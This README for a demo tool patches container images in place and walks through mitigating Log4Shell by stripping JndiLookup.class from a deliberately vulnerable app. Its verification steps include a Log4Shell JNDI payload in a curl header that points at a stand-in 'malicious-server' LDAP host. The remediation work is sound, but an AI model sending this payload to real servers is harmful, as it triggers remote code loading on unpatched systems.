> **WARNING**:
> DO NOT USE FOR PRODUCTION!
> This is a demo / proof of concept.
>
# Patching container images

## Motivation

Container images are meant to be immutable.
Any changes should be done by rebuilding the image.
When faced with a critical vulnerability such as [log4shell](https://en.wikipedia.org/wiki/Log4Shell), one might have very little time to remedy the situation.
In the optimal case there is a fix available and the container image can be easily rebuilt.

But what if:
* The container image is built by someone else and the fix is not available?
* The fixed version of the image is not backwards compatible and requires extensive work to take into use?

### The Idea

There should be a tool that allows applying a workaround by patching an existing container image.
The tool shall address following requirements:

* It shall be unnecessary to rebuild the image and have access to the original source files.
* It shall be possible to apply typical workarounds such as adding files, modifying files, removing files. That also implies it shall be possible to extract files from existing image to be modified.

With these capabilities, it should be possible to do only minimal changes to the original image.
That reduces the risk of breaking the backwards compatibility of the application, while still allowing quick remediation.

## Demo

The mitigation for [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) given by the maintainers ([link](https://logging.apache.org/log4j/2.x/security.html)) is to remove the vulnerable `class` from the impacted `jar` file by running

```
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

### Preparation


First we start by cloning and building an example application with log4j vulnerability


```
git clone https://github.com/christophetd/log4shell-vulnerable-app.git
cd log4shell-vulnerable-app
docker build . -t vulnerable-app:latest
```
Thanks to [@christophetd](https://github.com/christophetd) for making an excellent example application available!

To run the application execute:

```
docker run --rm -p 8080:8080 vulnerable-app:latest
```

To see that the application is vulnerable, make a request with exploit payload and observe from logs from the application, where it tries to connect to the LDAP server.
(you do not need to have a real LDAP server for this)

```
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://malicious-server:1389/}'
```

### Patching the vulnerable image

Clone this repository and compile `image-patcher`

```
make build
```

Use `image-patcher extract-jar` to extract the (suspected) vulnerable files.
It will go through all files in the source image and find `log4j-core` either directly as `jar` file or embedded within another `jar` file.
The command will extract all matching files to the `patch` directory.

```
./image-patcher extract-jar -source-tag vulnerable-app:latest -match 'log4j-core.+\.jar' -dest-dir patch
```

In this case, the `log4j-core` package is within executable `jar`.
Unzip the application to get to the `log4j-core` file

```
unzip -d jar patch/app/spring-boot-application.jar
```

Patch `log4j-core` by removing `JndiLookup.class` from the application `jar`

```
find jar -name 'log4j-core-*' -exec zip -q -d {} org/apache/logging/log4j/core/lookup/JndiLookup.class \;
```

Create a new executable application `jar` and overwrite the vulnerable version with it

```
(cd jar; zip -0 -r ../patched-spring-boot-application.jar .)
mv patched-spring-boot-application.jar patch/app/spring-boot-application.jar
```

Create a new patched container image, with an additional layer.
The contents of the layer is loaded from the `patch` directory

```
./image-patcher patch -source-tag vulnerable-app:latest -dest-tag patched-app:latest -patch-dir patch
```

Run the test again with the patched application and observe that it is not vulnerable anymore

```
docker run --rm -p 8080:8080 patched-app:latest
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://malicious-server:1389/}'
```

Observe that one additional layer was added to the image by `image-patcher patch` command

```
docker image inspect vulnerable-app:latest | tail -15
docker image inspect patched-app:latest | tail -16
```

## Final thoughts

The demo has manual steps for extracting and patching the `jar` file.
These steps could be automated as well.

The demo concentrates on `jar` manipulation for mitigating `log4j` vulnerability.
A general image patching tool could be implemented with support for more use cases.
